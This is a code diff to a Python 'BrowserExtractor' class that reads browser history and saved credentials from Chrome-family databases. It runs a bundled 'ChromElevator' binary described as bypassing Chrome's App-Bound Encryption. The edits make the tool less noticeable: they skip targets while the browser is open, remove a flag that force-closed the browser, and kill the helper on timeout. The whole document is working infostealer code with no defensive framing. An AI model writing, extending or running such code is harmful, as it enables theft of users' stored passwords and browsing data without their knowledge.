@@ -65,7 +65,7 @@ class BrowserExtractor:
             cursor.close()
             conn.close()
         except Exception as e:
-            print(f"[Extractor] Error extracting history from {db_path}: {e}")
+            logger.error(f"[Extractor] Error extracting history from {db_path}: {e}")
         finally:
             if os.path.exists(temp_db):
                 try:
@@ -125,7 +125,7 @@ class BrowserExtractor:
             cursor.close()
             conn.close()
         except Exception as e:
-            print(f"[Extractor] Error extracting credentials from {db_path}: {e}")
+            logger.error(f"[Extractor] Error extracting credentials from {db_path}: {e}")
         finally:
             if os.path.exists(temp_db):
                 try:
@@ -137,6 +137,38 @@ class BrowserExtractor:
 
     # Removed extract_cookies as requested
 
+    def _is_browser_running(self, browser_name):
+        """Check if browser process is running. Returns True if running OR if check fails (fail-safe)."""
+        try:
+            import psutil
+            # Map browser name to process name
+            proc_map = {
+                "chrome": "chrome.exe",
+                "google chrome": "chrome.exe",
+                "edge": "msedge.exe",
+                "msedge": "msedge.exe",
+                "brave": "brave.exe",
+                "opera": "opera.exe"
+            }
+            target = proc_map.get(browser_name.lower(), f"{browser_name.lower()}.exe")
+            
+            # Iterate over all running processes
+            for proc in psutil.process_iter(['name']):
+                try:
+                    if proc.info['name'] and proc.info['name'].lower() == target:
+                        logger.info(f"Detected running browser process: {proc.info['name']}")
+                        return True
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    pass
+        except ImportError:
+            logger.warning("psutil not installed. Assuming browser IS running to be safe.")
+            return True # Fail safe
+        except Exception as e:
+            logger.error(f"Error checking browser process: {e}. Assuming browser IS running.")
+            return True # Fail safe
+            
+        return False
+
     def run_elevation_pass(self, browser_name):
         """Runs ChromElevator to bypass ABE for a specific browser."""
         # Use absolute path to the binary in modules/browser/bin/
@@ -147,20 +179,46 @@ class BrowserExtractor:
             logger.warning(f"ChromElevator binary not found at {bin_path}")
             return None
             
+        # Check if browser is running to avoid killing it
+        if self._is_browser_running(browser_name):
+            logger.info(f"Skipping elevation for {browser_name} because it is currently running.")
+            return None
+            
         temp_out = os.path.normpath(os.path.join(tempfile.gettempdir(), f"abe_{browser_name.lower()}_{os.urandom(4).hex()}"))
         os.makedirs(temp_out, exist_ok=True)
         
         try:
             import subprocess
-            cmd = [f'"{bin_path}"', "--browser", browser_name.lower(), "-o", f'"{temp_out}"', "--kill"]
+            # Removed --kill flag to ensure we never force close the browser
+            cmd = [f'"{bin_path}"', "--browser", browser_name.lower(), "-o", f'"{temp_out}"']
             cmd_str = " ".join(cmd)
             logger.info(f"Running elevation pass: {cmd_str}")
             
-            # Use shell=True for better Windows support with quoted paths
-            subprocess.run(cmd_str, shell=True, capture_output=True, timeout=90)
+            # Use Popen for better control and ensuring termination
+            process = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            try:
+                stdout, stderr = process.communicate(timeout=30) # Reduced timeout to 30s
+                logger.debug(f"Elevation output: {stdout}")
+                if stderr:
+                    logger.debug(f"Elevation stderr: {stderr}")
+            except subprocess.TimeoutExpired:
+                logger.warning(f"Elevation pass timed out for {browser_name}. Terminating process.")
+                process.kill()
+                # Ensure it's really dead
+                try:
+                    process.wait(timeout=5)
+                except Exception:
+                    pass
+                return None
+            except Exception as e:
+                logger.error(f"Elevation pass error for {browser_name}: {e}")
+                process.kill()
+                return None
+                
             return temp_out
         except Exception as e:
-            logger.error(f"Elevation pass failed for {browser_name}: {e}")
+            logger.error(f"Elevation pass failed initialization for {browser_name}: {e}")
             if os.path.exists(temp_out):
                 shutil.rmtree(temp_out, ignore_errors=True)
             return None
